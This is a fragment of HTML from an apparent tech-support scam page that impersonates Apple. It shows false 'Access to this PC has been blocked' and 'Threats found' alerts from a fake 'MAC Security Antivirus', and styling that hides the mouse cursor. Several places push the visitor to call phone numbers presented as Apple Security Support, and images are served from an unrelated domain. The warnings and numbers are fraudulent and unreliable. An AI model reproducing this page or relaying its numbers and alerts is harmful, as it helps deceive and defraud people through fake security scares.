...
margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
               ...
               <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-888-983-4720  (Security Support)</strong></p>
...
<div id="websa" class="websa mnwebs">
  ...
  <div id="disclaimer">
    Access to this PC has been blocked for security reasons.<br>
      <span class="support">Contact Apple Support: +1-888-983-4720  (Security Support)</span>
  </div>
  <div id="bottom">
  ...
  <div class="row">
      ...
      <div class="col-md-12">
          <div class="right-foot" style="text-align: center;">
              <span id="footertxt" style="font-weight: 700;"><img src="https://shaneebonnerecipe.com/monkey/apple.png"> Apple</span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-888-983-4720  (Security Support)</span></span>
          </div>
      </div>
      <div class="col-md-12">
...
<div id="mndiv" style="cursor:none;">
<div class="modal exitModal" id="exitModal1" tabindex="-1" role="dialog" style="cursor:none">
    ...
    <div class="modal-content" style="background-color: red;color: #fff;">
      ...
      <div class="modal-body">
        <div class="media">
          ...
          <div class="media-body" style="cursor:none;">
            <h5 class="media-heading">Virus and threat protection</h5>
            <h5>Threats found</h5>
            <p>MAC Security Antivirus found threats. Get details.</p>
          </div>
        </div>
      </div>
    </div>
...
<div class="modal exitModal" id="exitModal2" tabindex="-1" role="dialog" style="cursor:none">
  <div class="modal-dialog modal-full-height modal-right" role="document">
    <div class="modal-content" style="background-color: red;color: #fff;">
      <img id="modal-exit" src="https://shaneebonnerecipe.com/bumbum/cross.png" class="modal-exit">
      <div class="modal-body">
        <div class="media">
          ...
          <div class="media-body" style="cursor:none;">
            <h5 class="media-heading">Firewall threat protection</h5>
            <h5>MAC Security took action</h5>
            <p>Your settings caused MAC Security Antivirus to block an app that may potentially perform unwanted actions on your device.</p>
          </div>
        </div>
      </div>
    </div>
...
<div class="modal exitModal" id="exitModal3" tabindex="-1" role="dialog" style="cursor:none">
  <div class="modal-dialog modal-full-height modal-right" role="document">
    <div class="modal-content" style="background-color: red;color: #fff;">
      <img id="modal-exit" src="https://shaneebonnerecipe.com/bumbum/cross.png" class="modal-exit">
      <div class="modal-body">
        <div class="media" style="cursor:none;">
          <div class="media-body">
            <h4 class="media-heading">Call Apple Support <br/> +1-888-930-9167
